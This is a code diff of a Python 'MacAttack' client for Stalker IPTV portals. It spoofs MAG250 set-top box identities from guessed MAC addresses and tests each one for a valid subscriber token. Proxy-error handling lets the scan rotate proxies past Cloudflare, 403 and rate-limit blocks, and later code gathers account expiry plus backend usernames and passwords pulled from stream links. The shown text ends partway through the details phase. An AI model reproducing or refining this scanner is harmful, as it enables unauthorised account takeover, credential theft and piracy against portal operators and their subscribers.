@@ -1,745 +1,234 @@
 """
-STB (Set-Top Box) API Client for Stalker Portals
-Handles authentication, token management, and API requests
-Based on original MacAttack implementation
+STB API Client v2.0 - Optimized for speed
+- No sessions (direct requests)
+- 2-Phase: Quick Scan (handshake) → Full Scan (details)
+- Proper error classification for proxy retry
+- Fast timeouts (3s connect, configurable read)
 """
 import requests
-from requests.adapters import HTTPAdapter, Retry
 from urllib.parse import urlparse, quote
-import urllib.parse
-import re
-import logging
-import time
 import hashlib
 import json
+import time
+import logging
 
 logger = logging.getLogger("MacAttack.stb")
-logger.setLevel(logging.DEBUG)
-
-# Session management
-_sessions = {}  # Per-proxy sessions
-_SESSION_MAX_AGE = 300
 
 
-def _get_session(proxy=None):
-    """Get or create a requests session for a specific proxy."""
-    global _sessions
-    
-    proxy_key = proxy or "direct"
-    current_time = time.time()
-    
-    if proxy_key in _sessions:
-        session, created = _sessions[proxy_key]
-        if (current_time - created) < _SESSION_MAX_AGE:
-            return session
-        else:
-            try:
-                session.close()
-            except:
-                pass
-    
-    session = requests.Session()
-    retries = Retry(total=2, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
-    session.mount("http://", HTTPAdapter(max_retries=retries))
-    session.mount("https://", HTTPAdapter(max_retries=retries))
-    
-    _sessions[proxy_key] = (session, current_time)
-    return session
+# ============== ERROR TYPES ==============
 
+class ProxyError(Exception):
+    """Base proxy error - retry MAC with different proxy"""
+    pass
+
+class ProxyDeadError(ProxyError):
+    """Proxy unreachable (connection refused, DNS fail)"""
+    pass
+
+class ProxySlowError(ProxyError):
+    """Proxy timeout"""
+    pass
+
+class ProxyBlockedError(ProxyError):
+    """Proxy blocked by portal (403, rate limit)"""
+    pass
+
+
+# ============== HELPERS ==============
 
 def parse_proxy(proxy_str):
-    """
-    Parse proxy string and return requests-compatible proxy dict.
-    Supports: HTTP, SOCKS4, SOCKS5
-    Formats:
-        - ip:port (HTTP)
-        - http://ip:port
-        - socks4://ip:port
-        - socks5://ip:port
-        - socks5://user:pass@ip:port
-    """
+    """Parse proxy string to requests format."""
     if not proxy_str:
         return None
-    
     proxy_str = proxy_str.strip()
-    
-    # Detect proxy type
-    if proxy_str.startswith("socks5://"):
-        return {
-            "http": proxy_str,
-            "https": proxy_str
-        }
-    elif proxy_str.startswith("socks4://"):
-        return {
-            "http": proxy_str,
-            "https": proxy_str
-        }
-    elif proxy_str.startswith("http://"):
-        return {
-            "http": proxy_str,
-            "https": proxy_str
-        }
-    else:
-        # Assume HTTP proxy (ip:port format)
-        return {
-            "http": f"http://{proxy_str}",
-            "https": f"http://{proxy_str}"
-        }
+    if proxy_str.startswith(("socks5://", "socks4://", "http://")):
+        return {"http": proxy_str, "https": proxy_str}
+    return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
 
 
-def _generate_device_ids(mac):
-    """Generate device IDs based on MAC address - matches original MacAttack."""
-    serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
-    sn = serialnumber[0:13]
+def generate_device_ids(mac):
+    """Generate device IDs from MAC."""
+    sn = hashlib.md5(mac.encode()).hexdigest().upper()[:13]
     device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
     device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
     hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
-    snmac = f"{sn}{mac}"
-    sig = hashlib.sha256(snmac.encode()).hexdigest().upper()
-    return sn, device_id, device_id2, hw_version_2, sig
+    return sn, device_id, device_id2, hw_version_2
 
 
-def _normalize_url(url):
-    """Normalize URL - remove trailing slashes to prevent double slashes."""
-    return url.rstrip('/')
-
-
-def auto_detect_portal_url(base_url, proxy=None, timeout=10):
-    """
-    Auto-detect portal endpoint from base URL.
-    User can enter just http://host:port and this will find the correct endpoint.
-    
-    Checks endpoints in order (exactly like original MacAttack):
-    1. /c/ (standard portal) -> portal.php
-    2. /stalker_portal/c/ (stalker portal) -> stalker_portal/server/load.php
-    
-    Returns: (full_url, portal_type, version) or (None, None, None) if not found
-    """
-    base_url = _normalize_url(base_url)
-    parsed = urlparse(base_url)
-    host = parsed.hostname
-    port = parsed.port or 80
-    scheme = parsed.scheme or "http"
-    
-    # If URL already has /c/ path, return as-is
-    if '/c' in parsed.path:
-        portal_type, version = detect_portal_type(base_url, proxy)
-        return base_url, portal_type, version
-    
-    # Build clean base URL
-    clean_base = f"{scheme}://{host}:{port}"
-    
-    headers = _get_headers()
-    proxies = parse_proxy(proxy)
-    session = _get_session(proxy)
-    
-    # Endpoints to check - EXACTLY like original MacAttack (only these 2)
-    endpoints = [
-        ("/c/", "portal.php"),
-        ("/stalker_portal/c/", "stalker_portal/server/load.php"),
-    ]
-    
-    for endpoint, default_portal_type in endpoints:
-        version_url = f"{clean_base}{endpoint}version.js"
-        try:
-            response = session.get(version_url, headers=headers, proxies=proxies, timeout=timeout)
-            if response.status_code == 200:
-                match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
-                if match:
-                    version = match.group(1)
-                    full_url = f"{clean_base}{endpoint.rstrip('/')}"
-                    logger.info(f"Auto-detected portal: {full_url} (version: {version})")
-                    return full_url, default_portal_type, version
-        except Exception as e:
-            logger.debug(f"Endpoint {endpoint} not found: {e}")
-            continue
-    
-    # Fallback: return with /c/ and let it fail gracefully
-    logger.debug(f"No portal endpoint auto-detected for {base_url}, defaulting to /c/")
-    return f"{clean_base}/c", "portal.php", "5.3.1"
-
-
-def _get_cookies(mac):
-    """Generate cookies for STB emulation - matches original MacAttack."""
-    sn, device_id, device_id2, hw_version_2, sig = _generate_device_ids(mac)
-    return {
-        "adid": hw_version_2,
-        "debug": "1",
-        "device_id2": device_id2,
-        "device_id": device_id,
-        "hw_version": "1.7-BD-00",
-        "mac": mac,
-        "sn": sn,
-        "stb_lang": "en",
-        "timezone": "America/Los_Angeles",
-    }
-
-
-def _get_headers(token=None, token_random=None):
-    """Generate headers for STB emulation - matches original MacAttack."""
+def get_headers(token=None, token_random=None):
+    """Get request headers."""
     headers = {
         "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
         "Accept-Encoding": "identity",
         "Accept": "*/*",
-        "Connection": "keep-alive",
+        "Connection": "close",  # No keep-alive for speed
     }
     if token:
         headers["Authorization"] = f"Bearer {token}"
-    if token_random:
+    if token_random is not None:
         headers["X-Random"] = str(token_random)
     return headers
 
 
-def detect_portal_type(url, proxy=None):
-    """Detect the portal type (portal.php or stalker_portal) - matches original."""
-    url = _normalize_url(url)
-    parsed_url = urlparse(url)
-    parsed_path = parsed_url.path
-    
-    if parsed_path.endswith("c"):
-        parsed_path = parsed_path[:-1]
-    if parsed_path.endswith("c/"):
-        parsed_path = parsed_path[:-2]
-    
-    host = parsed_url.hostname
-    port = parsed_url.port or 80
-    scheme = parsed_url.scheme or "http"
-    base_url = f"{scheme}://{host}:{port}"
-    
-    headers = _get_headers()
-    proxies = parse_proxy(proxy)
-    session = _get_session(proxy)
-    
-    # Check for type portal
-    try:
-        version_url = f"{base_url}/c/version.js"
-        response = session.get(version_url, headers=headers, proxies=proxies, timeout=10)
-        if response.status_code == 200:
-            match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
-            if match:
-                logger.info(f"Portal type: PORTAL version: {match.group(1)}")
-                return "portal.php", match.group(1)
-    except Exception as e:
-        logger.debug(f"Not type PORTAL: {e}")
-    
-    # Check for stalker_portal
-    try:
-        version_url = f"{base_url}/stalker_portal/c/version.js"
-        response = session.get(version_url, headers=headers, proxies=proxies, timeout=10)
-        if response.status_code == 200:
-            match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
-            if match:
-                logger.info(f"Portal type: STALKER_PORTAL version: {match.group(1)}")
-                return "stalker_portal/server/load.php", match.group(1)
-    except Exception as e:
-        logger.debug(f"Not type STALKER_PORTAL: {e}")
-    
-    # Default to portal.php
-    return "portal.php", "5.3.1"
+def get_cookies(mac):
+    """Get request cookies."""
+    sn, device_id, device_id2, hw_version_2 = generate_device_ids(mac)
+    return {
+        "adid": hw_version_2, "debug": "1", "device_id2": device_id2,
+        "device_id": device_id, "hw_version": "1.7-BD-00", "mac": mac,
+        "sn": sn, "stb_lang": "en", "timezone": "America/Los_Angeles",
+    }
 
 
-def get_token(url, mac, proxy=None, timeout=30):
-    """
-    Get authentication token from portal.
-    Includes X-Random header handling like original MacAttack.
-    """
-    # Normalize URL - remove trailing slash
+def get_portal_info(url):
+    """Extract base URL and portal type from URL."""
     url = url.rstrip('/')
+    parsed = urlparse(url)
+    host = parsed.hostname
+    port = parsed.port or 80
+    scheme = parsed.scheme or "http"
+    base = f"{scheme}://{host}:{port}"
     
-    parsed_url = urlparse(url)
-    parsed_path = parsed_url.path
+    if "stalker_portal" in url:
+        return base, "stalker_portal/server/load.php"
+    return base, "portal.php"
+
+
+def do_request(url, cookies, headers, proxies, timeout):
+    """
+    Make HTTP request with proper error handling.
     
-    if parsed_path.endswith("c"):
-        parsed_path = parsed_path[:-1]
-    if parsed_path.endswith("c/"):
-        parsed_path = parsed_path[:-2]
+    Returns: Response object
+    Raises: 
+        - ProxyDeadError: Connection failed, proxy offline
+        - ProxySlowError: Timeout, gateway errors
+        - ProxyBlockedError: Proxy blocked by portal (Cloudflare, rate limit)
     
-    host = parsed_url.hostname
-    port = parsed_url.port or 80
-    scheme = parsed_url.scheme or "http"
-    
-    portal_type, portal_version = detect_portal_type(url, proxy)
-    
-    # Build base URL
-    base_url = f"{scheme}://{host}:{port}{parsed_path}"
-    
-    # Fix double stalker_portal
-    if "stalker_portal/" in base_url and "stalker_portal/" in portal_type:
-        base_url = base_url.replace("stalker_portal/", "")
-    
-    # Build handshake URL - ensure no double slashes
-    handshake_url = f"{url}/{portal_type}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
-    
+    Note: HTTP 401 is NOT raised - caller must check (MAC invalid)
+    """
     try:
-        session = _get_session(proxy)
-        sn, device_id, device_id2, hw_version_2, sig = _generate_device_ids(mac)
+        # Fast connect timeout (3s), configurable read timeout
+        resp = requests.get(url, cookies=cookies, headers=headers, 
+                           proxies=proxies, timeout=(3, timeout))
         
-        cookies = {
-            "adid": hw_version_2,
-            "debug": "1",
-            "device_id2": device_id2,
-            "device_id": device_id,
-            "hw_version": "1.7-BD-00",
-            "mac": mac,
-            "sn": sn,
-            "stb_lang": "en",
-            "timezone": "America/Los_Angeles",
-        }
+        # Check for Cloudflare / HTML error pages (proxy blocked)
+        content_type = resp.headers.get("Content-Type", "").lower()
+        if "text/html" in content_type:
+            # Portal sent HTML instead of JSON = Proxy blocked or Cloudflare
+            if "cloudflare" in resp.text.lower() or "captcha" in resp.text.lower():
+                raise ProxyBlockedError("Cloudflare/Captcha detected")
+            # Could also be portal error page
+            if resp.status_code >= 400:
+                raise ProxyBlockedError(f"HTTP {resp.status_code} - HTML response")
         
-        headers = {
-            "Connection": "keep-alive",
-            "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-            "Accept-Encoding": "identity",
-            "Accept": "*/*",
-        }
+        # HTTP 401 = MAC invalid (NOT proxy error) - let caller handle
+        # HTTP 403 = Could be proxy blocked OR MAC invalid - check response
+        if resp.status_code == 403:
+            # Try to parse JSON - if it works, it's a MAC error
+            try:
+                data = resp.json()
+                # If we get valid JSON with error message, it's MAC-related
+                if isinstance(data, dict):
+                    return resp  # Let caller handle MAC error
+            except:
+                pass
+            # No valid JSON = Proxy blocked
+            raise ProxyBlockedError("403 Forbidden - Proxy blocked")
         
-        proxies = parse_proxy(proxy)
-        response = session.get(handshake_url, cookies=cookies, headers=headers, proxies=proxies, timeout=timeout)
-        logger.debug(f"Handshake response: {response.text[:500]}")
-        response.raise_for_status()
+        # Gateway errors = Proxy slow/overloaded
+        if resp.status_code in (502, 503, 504):
+            raise ProxySlowError(f"Gateway error {resp.status_code}")
         
-        data = response.json()
+        # 429 = Rate limit (proxy blocked)
+        if resp.status_code == 429:
+            raise ProxyBlockedError("Rate limit exceeded")
+        
+        return resp
+        
+    except requests.exceptions.ConnectTimeout:
+        raise ProxyDeadError("Connect timeout")
+    except requests.exceptions.ReadTimeout:
+        raise ProxySlowError("Read timeout")
+    except requests.exceptions.ProxyError as e:
+        raise ProxyDeadError(f"Proxy error: {e}")
+    except requests.exceptions.ConnectionError as e:
+        err = str(e).lower()
+        if any(x in err for x in ["refused", "unreachable", "no route", "dns"]):
+            raise ProxyDeadError(str(e))
+        raise ProxySlowError(str(e))
+    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
+        raise
+    except Exception as e:
+        raise ProxyError(str(e))
+
+
+# ============== MAIN SCAN FUNCTION ==============
+
+def test_mac(url, mac, proxy=None, timeout=10):
+    """
+    Test MAC address - Two phase approach:
+    
+    Phase 1 (Quick Scan): Handshake only
+    - Token received = VALID → continue to Phase 2
+    - No token = NOT VALID → return immediately
+    - Proxy error → raise for retry with different proxy
+    
+    Phase 2 (Full Scan): Get all details
+    - Collect expiry, channels, genres, etc.
+    - Proxy errors here also raise for retry
+    
+    Returns: (is_valid, result_dict)
+    - is_valid: True if token received (MAC is valid)
+    - result_dict: All collected data
+    
+    Raises: ProxyDeadError, ProxySlowError, ProxyBlockedError
+    """
+    base_url, portal_type = get_portal_info(url)
+    cookies = get_cookies(mac)
+    headers = get_headers()
+    proxies = parse_proxy(proxy)
+    
+    # ========== PHASE 1: QUICK SCAN (Handshake) ==========
+    handshake_url = f"{base_url}/{portal_type}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
+    
+    resp = do_request(handshake_url, cookies, headers, proxies, timeout)
+    
+    # Check HTTP status
+    if resp.status_code == 401:
+        # MAC invalid/expired
+        return False, {"mac": mac, "error": "401 Unauthorized"}
+    
+    # Check for portal errors (not proxy related)
+    if "REMOTE_ADDR" in resp.text or "Backend not available" in resp.text:
+        return False, {"mac": mac, "error": "Portal error"}
+    
+    # Parse token - handle invalid JSON
+    token = None
+    token_random = None
+    try:
+        data = resp.json()
         token = data.get("js", {}).get("token")
         token_random = data.get("js", {}).get("random")
-        
-        if token:
-            # Handle X-Random like original MacAttack
-            if token_random:
-                logger.debug(f"RANDOM: {token_random}")
-                sig = hashlib.sha256(str(token_random).encode()).hexdigest().upper()
-                
-                metrics = {
-                    "mac": mac,
-                    "sn": sn,
-                    "type": "STB",
-                    "model": "MAG250",
-                    "uid": device_id,
-                    "random": token_random,
-                }
-                json_string = json.dumps(metrics)
-                encoded_string = urllib.parse.quote(json_string)
-                
-                # Update session headers for subsequent requests
-                session.headers.update({
-                    "Connection": "keep-alive",
-                    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-                    "Accept-Encoding": "identity",
-                    "Accept": "*/*",
-                    "Authorization": f"Bearer {token}",
-                    "X-Random": str(token_random),
-                })
-                
-                session.cookies.update(cookies)
-                
-                # Get profile with metrics (like original)
-                profile_url = (
-                    f"{url}/{portal_type}?type=stb&action=get_profile&hd=1"
-                    f"&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; "
-                    f"PORTAL version: {portal_version}; API Version: JS API version: 343; "
-                    f"STB API version: 146; Player Engine version: 0x58c"
-                    f"&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218"
-                    f"&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}"
-                    f"&sig={sig}&auth_second_step=1&hw_version=1.7-BD-00"
-                    f"&not_valid_token=0&metrics={encoded_string}&hw_version_2={hw_version_2}"
-                    f"&timestamp={round(time.time())}&api_sig=262&prehash=0"
-                )
-                try:
-                    session.get(profile_url, proxies=proxies, timeout=timeout)
-                except:
-                    pass
-            
-            logger.info(f"Token retrieved for MAC {mac}")
-            return token, token_random, portal_type, portal_version
-        
-        logger.error("Token not found in handshake response")
-        return None, None, None, None
-        
+    except (json.JSONDecodeError, ValueError) as e:
+        # Invalid JSON = Portal overloaded or proxy issue
+        raise ProxySlowError(f"Invalid JSON response: {e}")
     except Exception as e:
-        logger.error(f"Error getting token: {e}")
-        return None, None, None, None
-
-
-def get_profile(url, mac, token, portal_type, token_random=None, proxy=None):
-    """Get account profile information."""
-    url = _normalize_url(url)
-    try:
-        session = _get_session(proxy)
-        cookies = _get_cookies(mac)
-        cookies["token"] = token
-        headers = _get_headers(token, token_random)
-        proxies = parse_proxy(proxy)
-        
-        profile_url = f"{url}/{portal_type}?type=stb&action=get_profile&JsHttpRequest=1-xml"
-        response = session.get(profile_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
-        response.raise_for_status()
-        
-        return response.json().get("js", {})
-    except Exception as e:
-        logger.error(f"Error getting profile: {e}")
-        return {}
-
-
-def get_account_info(url, mac, token, portal_type, token_random=None, proxy=None):
-    """Get account expiration info."""
-    url = _normalize_url(url)
-    try:
-        session = _get_session(proxy)
-        cookies = _get_cookies(mac)
-        cookies["token"] = token
-        headers = _get_headers(token, token_random)
-        proxies = parse_proxy(proxy)
-        
-        info_url = f"{url}/{portal_type}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
-        response = session.get(info_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
-        response.raise_for_status()
-        
-        return response.json().get("js", {})
-    except Exception as e:
-        logger.error(f"Error getting account info: {e}")
-        return {}
-
-
-def get_genres(url, mac, token, portal_type, token_random=None, proxy=None):
-    """Get live TV genres/categories."""
-    url = _normalize_url(url)
-    try:
-        session = _get_session(proxy)
-        cookies = _get_cookies(mac)
-        cookies["token"] = token
-        headers = _get_headers(token, token_random)
-        proxies = parse_proxy(proxy)
-        
-        genres_url = f"{url}/{portal_type}?type=itv&action=get_genres&JsHttpRequest=1-xml"
-        response = session.get(genres_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
-        response.raise_for_status()
-        
-        return response.json().get("js", [])
-    except Exception as e:
-        logger.error(f"Error getting genres: {e}")
-        return []
-
-
-def get_vod_categories(url, mac, token, portal_type, token_random=None, proxy=None):
-    """Get VOD categories."""
-    url = _normalize_url(url)
-    try:
-        session = _get_session(proxy)
-        cookies = _get_cookies(mac)
-        cookies["token"] = token
-        headers = _get_headers(token, token_random)
-        proxies = parse_proxy(proxy)
-        
-        vod_url = f"{url}/{portal_type}?type=vod&action=get_categories&JsHttpRequest=1-xml"
-        response = session.get(vod_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
-        response.raise_for_status()
-        
-        return response.json().get("js", [])
-    except Exception as e:
-        logger.error(f"Error getting VOD categories: {e}")
-        return []
-
-
-def get_series_categories(url, mac, token, portal_type, token_random=None, proxy=None):
-    """Get series categories."""
-    url = _normalize_url(url)
-    try:
-        session = _get_session(proxy)
-        cookies = _get_cookies(mac)
-        cookies["token"] = token
-        headers = _get_headers(token, token_random)
-        proxies = parse_proxy(proxy)
-        
-        series_url = f"{url}/{portal_type}?type=series&action=get_categories&JsHttpRequest=1-xml"
-        response = session.get(series_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
-        response.raise_for_status()
-        
-        return response.json().get("js", [])
-    except Exception as e:
-        logger.error(f"Error getting series categories: {e}")
-        return []
-
-
-def get_channels(url, mac, token, portal_type, category_type, category_id, token_random=None, proxy=None, page=0):
-    """Get channels/items from a category."""
-    url = _normalize_url(url)
-    try:
-        session = _get_session(proxy)
-        cookies = _get_cookies(mac)
-        cookies["token"] = token
-        headers = _get_headers(token, token_random)
-        proxies = parse_proxy(proxy)
-        
-        if category_type == "IPTV":
-            channels_url = f"{url}/{portal_type}?type=itv&action=get_ordered_list&genre={category_id}&JsHttpRequest=1-xml&p={page}"
-        elif category_type == "VOD":
-            channels_url = f"{url}/{portal_type}?type=vod&action=get_ordered_list&category={category_id}&JsHttpRequest=1-xml&p={page}"
-        elif category_type == "Series":
-            channels_url = f"{url}/{portal_type}?type=series&action=get_ordered_list&category={category_id}&p={page}&JsHttpRequest=1-xml"
-        else:
-            return [], 0
-        
-        response = session.get(channels_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
-        response.raise_for_status()
-        
-        data = response.json().get("js", {})
-        channels = data.get("data", [])
-        total_items = int(data.get("total_items", 0))
-        
-        return channels, total_items
-    except Exception as e:
-        logger.error(f"Error getting channels: {e}")
-        return [], 0
-
-
-def get_stream_url(url, mac, token, portal_type, cmd, token_random=None, proxy=None):
-    """Get stream URL for a channel."""
-    url = _normalize_url(url)
-    try:
-        session = _get_session(proxy)
-        cookies = _get_cookies(mac)
-        cookies["token"] = token
-        headers = _get_headers(token, token_random)
-        proxies = parse_proxy(proxy)
-        
-        stream_url = f"{url}/{portal_type}?type=itv&action=create_link&cmd={quote(cmd)}&JsHttpRequest=1-xml"
-        response = session.get(stream_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
-        response.raise_for_status()
-        
-        data = response.json().get("js", {})
-        cmd_result = data.get("cmd", "")
-        
-        if cmd_result:
-            parts = cmd_result.split(" ")
-            if len(parts) > 1:
-                return parts[-1]
-            return cmd_result
-        
-        return None
-    except Exception as e:
-        logger.error(f"Error getting stream URL: {e}")
-        return None
-
-
-def get_vod_stream_url(url, mac, token, portal_type, cmd, token_random=None, proxy=None):
-    """Get stream URL for VOD content."""
-    url = _normalize_url(url)
-    try:
-        session = _get_session(proxy)
-        cookies = _get_cookies(mac)
-        cookies["token"] = token
-        headers = _get_headers(token, token_random)
-        proxies = parse_proxy(proxy)
-        
-        stream_url = f"{url}/{portal_type}?type=vod&action=create_link&cmd={quote(cmd)}&JsHttpRequest=1-xml"
-        response = session.get(stream_url, cookies=cookies, headers=headers, proxies=proxies, timeout=15)
-        response.raise_for_status()
-        
-        data = response.json().get("js", {})
-        cmd_result = data.get("cmd", "")
-        
-        if cmd_result:
-            parts = cmd_result.split(" ")
-            if len(parts) > 1:
-                return parts[-1]
-            return cmd_result
-        
-        return None
-    except Exception as e:
-        logger.error(f"Error getting VOD stream URL: {e}")
-        return None
-
-
-def test_mac(url, mac, proxy=None, timeout=15):
-    """Test if a MAC address is valid on a portal - EXACTLY like original MacAttack."""
-    url = _normalize_url(url)
-    try:
-        token, token_random, portal_type, portal_version = get_token(url, mac, proxy, timeout)
-        
-        if not token:
-            return False, None, "No token"
-        
-        # Get profile first (like original) - this activates the session
-        profile = get_profile(url, mac, token, portal_type, token_random, proxy)
-        
-        # Extract expire_billing_date and client_ip from profile if available (like original)
-        exp_billing = None
-        client_ip = None
-        if profile and isinstance(profile, dict):
-            exp_billing = profile.get("expire_billing_date")
-            client_ip = profile.get("ip")
-            # Convert expire_billing_date format like original
-            if exp_billing:
-                try:
-                    from datetime import datetime as dt
-                    dt_object = dt.strptime(exp_billing, "%Y-%m-%d %H:%M:%S")
-                    exp_billing = dt_object.strftime("%B %d, %Y, %I:%M %p")
-                except (ValueError, TypeError):
-                    pass
-        
-        # Get account info - this is where we check validity (EXACTLY like original)
-        account_info = get_account_info(url, mac, token, portal_type, token_random, proxy)
-        
-        # Original MacAttack checks: "mac" in data["js"] AND "phone" in data["js"]
-        if account_info and isinstance(account_info, dict):
-            acc_mac = account_info.get("mac")
-            phone = account_info.get("phone")
-            
-            # EXACTLY like original: both mac AND phone must be present
-            if acc_mac is not None and phone is not None:
-                expiry = phone
-                
-                # If phone is empty string, use expire_billing_date (like original)
-                if expiry == "":
-                    expiry = "Unknown"
-                    if exp_billing:
-                        expiry = exp_billing
-                
-                # Try to convert Unix timestamp to readable date (like original)
-                try:
-                    timestamp = int(expiry)
-                    from datetime import datetime as dt
-                    expiry = dt.utcfromtimestamp(timestamp).strftime("%B %d, %Y, %I:%M %p")
-                except (ValueError, TypeError):
-                    # If it fails, it's already in human-readable format
-                    pass
-                
-                logger.info(f"HIT! MAC: {mac} - Expiry: {expiry}")
-                return True, expiry, "Valid"
-        
-        return False, None, "No valid account info"
-        
-    except Exception as e:
-        logger.error(f"Error testing MAC {mac}: {e}")
-        return False, None, str(e)
-
-
-def get_all_channels(url, mac, token, portal_type, token_random=None, proxy=None, timeout=15):
-    """Get all channels count - like original MacAttack."""
-    url = _normalize_url(url)
-    try:
-        session = _get_session(proxy)
-        cookies = _get_cookies(mac)
-        cookies["token"] = token
-        headers = _get_headers(token, token_random)
-        proxies = parse_proxy(proxy)
-        
-        channels_url = f"{url}/{portal_type}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
-        response = session.get(channels_url, cookies=cookies, headers=headers, proxies=proxies, timeout=timeout)
-        
-        if response.status_code == 200:
-            data = response.json()
-            if isinstance(data, dict) and "js" in data and "data" in data["js"]:
-                return len(data["js"]["data"])
-        return 0
-    except Exception as e:
-        logger.error(f"Error getting all channels: {e}")
-        return 0
-
-
-def get_stream_info(url, mac, token, portal_type, token_random=None, proxy=None, timeout=15):
-    """
-    Get stream info including backend URL and credentials - like original MacAttack.
-    Returns: (backend_url, username, password) or (None, None, None)
-    """
-    url = _normalize_url(url)
-    try:
-        session = _get_session(proxy)
-        cookies = _get_cookies(mac)
-        cookies["token"] = token
-        headers = _get_headers(token, token_random)
-        proxies = parse_proxy(proxy)
-        
-        # Create link to extract backend info (like original)
-        link_url = f"{url}/{portal_type}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
-        response = session.get(link_url, cookies=cookies, headers=headers, proxies=proxies, timeout=timeout)
-        
-        if response.status_code == 200:
-            data = response.json()
-            js_data = data.get("js", {})
-            cmd_value = js_data.get("cmd")
-            
-            if cmd_value:
-                # Clean up ffmpeg prefix like original
-                cmd_value = cmd_value.replace("ffmpeg ", "", 1)
-                cmd_value = cmd_value.replace("'ffmpeg' ", "")
-                
-                # Parse URL to extract backend and credentials
-                parsed = urlparse(cmd_value)
-                backend_url = f"{parsed.scheme}://{parsed.hostname}"
-                if parsed.port:
-                    backend_url += f":{parsed.port}"
-                
-                # Extract username/password from path
-                path_parts = parsed.path.strip("/").split("/")
-                username = None
-                password = None
-                if len(path_parts) >= 2:
-                    username = path_parts[0]
-                    password = path_parts[1]
-                
-                return backend_url, username, password
-        
-        return None, None, None
-    except Exception as e:
-        logger.error(f"Error getting stream info: {e}")
-        return None, None, None
-
-
-def get_xtream_info(backend_url, username, password, timeout=15):
-    """
-    Get Xtream API info - like original MacAttack.
-    Returns dict with: active_cons, max_connections, created_at
-    """
-    try:
-        xtream_url = f"{backend_url}/player_api.php?username={username}&password={password}"
-        response = requests.get(xtream_url, timeout=timeout)
-        
-        if response.status_code == 200:
-            data = response.json()
-            user_info = data.get("user_info", {})
-            
-            result = {}
-            
-            if "active_cons" in user_info:
-                try:
-                    result["active_cons"] = int(user_info["active_cons"])
-                except (ValueError, TypeError):
-                    result["active_cons"] = None
-            
-            if "max_connections" in user_info:
-                try:
-                    result["max_connections"] = int(user_info["max_connections"])
-                except (ValueError, TypeError):
-                    result["max_connections"] = None
-            
-            if "created_at" in user_info:
-                try:
-                    from datetime import datetime as dt, timezone as tz
-                    timestamp = int(user_info["created_at"])
-                    result["created_at"] = dt.fromtimestamp(timestamp, tz.utc).strftime("%B %d, %Y, %I:%M %p")
-                except (ValueError, TypeError):
-                    result["created_at"] = None
-            
-            return result
-        
-        return {}
-    except Exception as e:
-        logger.error(f"Error getting Xtream info: {e}")
-        return {}
-
-
-def test_mac_full(url, mac, proxy=None, timeout=15):
-    """
-    Full MAC test - EXACTLY like original MacAttack.
-    Returns all info: expiry, channels, genres, VOD, backend info, etc.
+        # Empty response or other parsing error
+        raise ProxySlowError(f"Failed to parse response: {e}")
     
-    Returns: (success, result_dict) where result_dict contains all collected data
-    """
-    url = _normalize_url(url)
+    if not token:
+        # Portal said no token = MAC NOT VALID
+        return False, {"mac": mac, "error": "No token"}
+    
+    # ========== TOKEN RECEIVED = MAC IS VALID ==========
+    # ========== PHASE 2: FULL SCAN (Details) ==========
+    
+    sn, device_id, device_id2, hw_version_2 = generate_device_ids(mac)
+    headers = get_headers(token, token_random)
+    
     result = {
         "mac": mac,
-        "portal": url,
-        "expiry": None,
+        "expiry": "Unknown",
         "channels": 0,
         "genres": [],
         "vod_categories": [],
@@ -748,104 +237,331 @@ def test_mac_full(url, mac, proxy=None, timeout=15):
         "username": None,
         "password": None,
         "max_connections": None,
-        "active_cons": None,
         "created_at": None,
         "client_ip": None,
     }
     
+    # Calculate sig
+    if token_random:
+        sig = hashlib.sha256(str(token_random).encode()).hexdigest().upper()
+    else:
+        sig = hashlib.sha256(f"{sn}{mac}".encode()).hexdigest().upper()
+    
+    metrics = json.dumps({"mac": mac, "sn": sn, "type": "STB", "model": "MAG250", 
+                          "uid": device_id, "random": token_random or 0})
+    
+    # Step 1: Activate profile (critical - raises on proxy error)
     try:
-        # Step 1: Get token
-        token, token_random, portal_type, portal_version = get_token(url, mac, proxy, timeout)
+        profile_url = f"{base_url}/{portal_type}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: 5.3.1; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&sig={sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={quote(metrics)}&hw_version_2={hw_version_2}&timestamp={int(time.time())}&api_sig=262&prehash=0"
+        resp = do_request(profile_url, cookies, headers, proxies, timeout)
         
-        if not token:
-            return False, result
-        
-        # Step 2: Get profile (like original)
